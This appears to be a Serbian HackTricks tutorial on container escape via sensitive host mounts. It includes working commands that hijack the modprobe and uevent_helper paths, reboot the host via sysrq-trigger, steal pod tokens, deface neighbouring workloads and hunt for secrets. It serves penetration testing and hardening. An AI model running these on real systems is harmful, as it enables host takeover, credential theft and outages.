# Osetljivi host mountovi

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Host mounts su jedna od najvažnijih praktičnih površina za container-escape jer često urušavaju pažljivo izolovan prikaz procesa i ponovo otkrivaju direktan pristup host resursima. Opasni slučajevi nisu ograničeni na `/`. Bind mountovi `/proc`, `/sys`, `/var`, runtime soketa, stanja kojima upravlja kubelet, ili putanja vezanih za uređaje mogu otkriti kontrole kernela, kredencijale, fajl sisteme susednih kontejnera i runtime interfejse za upravljanje.

Ova stranica postoji odvojeno od pojedinačnih stranica o zaštiti jer se model zloupotrebe proteže kroz više oblasti. Host mount koji dozvoljava upis je opasan delimično zbog mount namespaces, delimično zbog user namespaces, delimično zbog AppArmor ili SELinux pokrivenosti, i delimično zbog toga koja je tačna host putanja izložena. Posmatranje toga kao posebne teme olakšava razumevanje attack surface-a.

## `/proc` izlaganje

procfs sadrži i obične informacije o procesu i kernel interfejse velikog uticaja za kontrolu. Bind mount kao `-v /proc:/host/proc` ili prikaz u kontejneru koji izlaže neočekivane writable proc unose može stoga dovesti do otkrivanja informacija, denial of service, ili direktnog izvršavanja koda na hostu.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Zloupotreba

Počnite proverom koji su procfs unosi visoke vrednosti vidljivi ili dozvoljavaju upis:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ove putanje su zanimljive iz različitih razloga. `core_pattern`, `modprobe`, i `binfmt_misc` mogu postati putanje za izvršavanje koda na hostu kada su upisive. `kallsyms`, `kmsg`, `kcore`, i `config.gz` su snažni izvori za izviđanje pri eksploataciji kernela. `sched_debug` i `mountinfo` otkrivaju procesni, cgroup i filesystem kontekst koji može pomoći pri rekonstrukciji host layout-a iz kontejnera.

Praktična vrednost svake putanje se razlikuje, i tretirati ih sve kao da imaju isti uticaj otežava trijažu:

- `/proc/sys/kernel/core_pattern`
  Ako je upisiva, ovo je jedna od putanja u procfs-u sa najvećim uticajem zato što kernel izvršava pipe handler nakon pada. Kontejner koji može usmeriti `core_pattern` na payload smešten u svom overlay-u ili u montiranoj host putanji često može dobiti izvršavanje koda na hostu. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
  Ova putanja kontroliše userspace helper koji kernel koristi kada treba da pokrene logiku učitavanja modula. Ako je upisiva iz kontejnera i interpretira se u host kontekstu, može postati još jedan primitiv za izvršavanje koda na hostu. Posebno je zanimljiva kada se kombinuje sa načinom za okidanje helper putanje.
- `/proc/sys/vm/panic_on_oom`
  Obično nije čist escape primitiv, ali može pretvoriti pritisak memorije u host-wide denial of service tako što će OOM uslove pretvoriti u kernel panic ponašanje.
- `/proc/sys/fs/binfmt_misc`
  Ako je registracioni interfejs upisiv, napadač može registrovati handler za izabranu magic vrednost i dobiti izvršavanje u host kontekstu kada se pokrene odgovarajući fajl.
- `/proc/config.gz`
  Koristan za triage kernel exploita. Pomaže odrediti koji podsistemi, mitigacije i opcionе kernel funkcije su omogućene bez potrebe za metapodacima paketa na hostu.
- `/proc/sysrq-trigger`
  Pretežno putanja za denial-of-service, ali veoma ozbiljna. Može odmah restartovati, izazvati kernel panic ili na drugi način odmah poremetiti host.
- `/proc/kmsg`
  Otkriva poruke iz kernel ring buffera. Korisno za host fingerprinting, analizu crash-a, i u nekim okruženjima za leaking informacija korisnih za kernel exploitation.
- `/proc/kallsyms`
  Vredno kada je čitljivo jer otkriva izvezene informacije o kernel simbolima i može pomoći u obaranju pretpostavki o address randomization tokom razvoja kernel exploita.
- `/proc/[pid]/mem`
  Ovo je direktan interfejs za memoriju procesa. Ako je ciljni proces dostupan uz neophodne ptrace-style uslove, može omogućiti čitanje ili menjanje memorije drugog procesa. Realističan uticaj uveliko zavisi od privilegija, `hidepid`, Yama i ptrace restrikcija, tako da je moćna ali uslovna putanja.
- `/proc/kcore`
  Otkriva prikaz sistema memorije sličan core image-u. Fajl je ogroman i nezgodan za korišćenje, ali ako je čitljiv u značajnoj meri ukazuje na loše izložen interfejs memorije hosta.
- `/proc/kmem` and `/proc/mem`
  Istorijski su to interfejsi sirove memorije sa visokim uticajem. Na mnogim modernim sistemima su onemogućeni ili strogo ograničeni, ali ako postoje i mogu se koristiti treba ih smatrati kritičnim nalazima.
- `/proc/sched_debug`
  Leaks scheduling i task information koje mogu otkriti identitete procesa na hostu čak i kada drugi pregledi procesa izgledaju čišći nego što se očekivalo.
- `/proc/[pid]/mountinfo`
  Izuzetno korisno za rekonstruisanje gde se kontejner zaista nalazi na hostu, koje putanje su overlay-backed, i da li writable mount odgovara sadržaju na hostu ili samo sloju kontejnera.

Ako su `/proc/[pid]/mountinfo` ili detalji overlay-a čitljivi, koristite ih da rekonstrušete host path fajl sistema kontejnera:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ove komande su korisne zato što mnogi trikovi za izvršavanje na hostu zahtevaju prevođenje putanje unutar kontejnera u odgovarajuću putanju iz perspektive hosta.

### Potpun primer: `modprobe` Helper Path Abuse

Ako je `/proc/sys/kernel/modprobe` writable iz kontejnera i helper path se tumači u kontekstu hosta, može biti preusmerena na napadačev payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tačan okidač zavisi od mete i ponašanja kernela, ali važna poenta je da pomoćna putanja koja dozvoljava pisanje može preusmeriti budući kernel helper poziv na sadržaj host-path koji kontroliše napadač.

### Potpun primer: Kernel Recon sa `kallsyms`, `kmsg` i `config.gz`

Ako je cilj procena eksploatabilnosti, a ne neposredno bekstvo:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ove komande pomažu da se utvrdi da li su korisne informacije o simbolima vidljive, da li nedavne kernel poruke otkrivaju interesantno stanje i koje su kernel funkcije ili mitigacije kompajlirane. Uticaj obično nije direktno escape, ali može znatno skratiti trijažu kernel ranjivosti.

### Potpuni primer: SysRq - ponovno pokretanje hosta

Ako je `/proc/sysrq-trigger` upisiv i dostupan iz prikaza hosta:
```bash
echo b > /proc/sysrq-trigger
```
Efekat je trenutno ponovno pokretanje hosta. Ovo nije suptilan primer, ali jasno pokazuje da izlaganje procfs može biti daleko ozbiljnije od pukog otkrivanja informacija.

## `/sys` izloženost

sysfs izlaže velike količine kernel i device stanja. Neki sysfs putevi su uglavnom korisni za fingerprinting, dok drugi mogu uticati na helper execution, ponašanje uređaja, konfiguraciju security-module, ili na firmware state.

Visoko-vredne sysfs putanje uključuju:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ove putanje su važne iz različitih razloga. `/sys/class/thermal` može uticati na ponašanje thermal-management i samim tim stabilnost hosta u loše izloženim okruženjima. `/sys/kernel/vmcoreinfo` može leak crash-dump i kernel-layout informacije koje pomažu u low-level host fingerprintingu. `/sys/kernel/security` je `securityfs` interfejs koji koriste Linux Security Modules, pa neočekivan pristup tamo može expose-ovati ili izmeniti MAC-related stanje. EFI variable putanje mogu uticati na firmware-backed boot postavke, čineći ih mnogo ozbiljnijim od običnih konfig fajlova. `debugfs` pod `/sys/kernel/debug` je posebno opasan jer je namerno developer-oriented interfejs sa znatno manje bezbednosnih očekivanja nego hardened production-facing kernel APIs.

Korisne komande za pregled ovih putanja su:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Šta čini ove komande zanimljivim:

- `/sys/kernel/security` može otkriti da li je AppArmor, SELinux, ili neki drugi LSM interfejs vidljiv na način koji je trebalo da ostane samo na hostu.
- `/sys/kernel/debug` je često najuznemirujuće otkriće u ovoj grupi. Ako je `debugfs` montiran i čitljiv ili upisiv, očekujte široku površinu okrenutu ka kernelu čiji tačan rizik zavisi od omogućених debug čvorova.
- Izlaganje EFI promenljivih je ređe, ali ako postoji, ima veliki uticaj jer pogađa podešavanja podržana firmverom umesto običnih runtime datoteka.
- `/sys/class/thermal` je pre svega relevantan za stabilnost hosta i interakciju sa hardverom, a ne za elegantan shell-style escape.
- `/sys/kernel/vmcoreinfo` je uglavnom izvor za host-fingerprinting i crash-analysis, koristan za razumevanje niskonivog kernel stanja.

### Potpun primer: `uevent_helper`

Ako je `/sys/kernel/uevent_helper` upisiv, kernel može izvršiti pomoćni program koji kontroliše napadač kada se pokrene `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Razlog zbog kojeg ovo funkcioniše je što se pomoćna putanja tumači iz perspektive hosta. Kada se aktivira, pomoćni program se izvršava u kontekstu hosta umesto unutar trenutnog kontejnera.

## `/var` Izloženost

Montiranje hostovog `/var` u kontejner se često potcenjuje zato što ne izgleda tako dramatično kao montiranje `/`. U praksi može biti dovoljno da se pristupi runtime sockets, direktorijumima snapshot-a kontejnera, kubelet-managed pod volumes, projected service-account tokens i fajl-sistemima susednih aplikacija. Na modernim čvorovima, `/var` je često mesto gde se zaista nalazi najinteresantnije operativno stanje kontejnera.

### Kubernetes Primer

Pod sa `hostPath: /var` često može pročitati projektovane tokene drugih podova i sadržaj overlay snapshot-a:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ove komande su korisne jer odgovaraju na pitanje da li mount izlaže samo dosadne podatke aplikacije ili visokorizične akreditive klastera. Čitljiv service-account token može odmah da pretvori local code execution u pristup Kubernetes API.

Ako token postoji, proverite šta može da dosegne umesto da se zaustavite samo na otkriću tokena:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Uticaj ovde može biti znatno veći od pristupa lokalnom čvoru. Token sa širokim RBAC-om može montirani `/var` pretvoriti u kompromis čitavog klastera.

### Primer za Docker i containerd

Na Docker hostovima relevantni podaci se često nalaze pod `/var/lib/docker`, dok se na Kubernetes čvorovima koji koriste containerd mogu nalaziti pod `/var/lib/containerd` ili u putanjama specifičnim za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ako montirani `/var` izlaže upisiv sadržaj snapshot-a drugog workload-a, napadač može da izmeni fajlove aplikacije, postavi web sadržaj ili promeni skripte za pokretanje bez menjanja trenutne konfiguracije kontejnera.

Konkretne ideje zloupotrebe kada se pronađe upisiv sadržaj snapshot-a:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ove komande su korisne jer prikazuju tri glavne kategorije uticaja montiranog `/var`: application tampering, secret recovery i lateral movement into neighboring workloads.

## Runtime Sockets

Sensitive host mounts često uključuju runtime sockets umesto celih direktorijuma. One su toliko važne da zaslužuju eksplicitno ponavljanje ovde:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za kompletne tokove eksploatacije kada je jedan od ovih sockets mounted.

Kao brz početni obrazac interakcije:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ako jedno od ovih uspe, put od "mounted socket" do "start a more privileged sibling container" obično je znatno kraći nego bilo koji kernel breakout put.

## CVE-ovi vezani za mount

Host mount-ovi takođe se preklapaju sa runtime ranjivostima. Važni nedavni primeri uključuju:

- `CVE-2024-21626` u `runc`, gde leaked directory file descriptor može postaviti working directory na host filesystem.
- `CVE-2024-23651` i `CVE-2024-23653` u BuildKit, gde OverlayFS copy-up races mogu proizvesti host-path writes tokom builds.
- `CVE-2024-1753` u Buildah i Podman build flow-ovima, gde crafted bind mounts tokom build-a mogu izložiti `/` kao read-write.
- `CVE-2024-40635` u containerd, gde velika `User` vrednost može overflow-ovati u ponašanje UID 0.

Ovi CVE-ovi su važni ovde jer pokazuju da rukovanje mount-ovima nije samo pitanje konfiguracije operatora. Sam runtime takođe može da uvede mount-driven escape uslove.

## Provere

Koristite ove komande da brzo pronađete mount izloženosti najvećeg rizika:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
What is interesting here:

- Root hosta, `/proc`, `/sys`, `/var` i runtime soketi su svi nalazi visokog prioriteta.
- Upisivi proc/sys unosi često znače da mount izlaže host-globalne kernel kontrole umesto bezbednog prikaza kontejnera.
- Montirane `/var` putanje zaslužuju pregled kredencijala i susednih workload-a, a ne samo pregled fajl sistema.
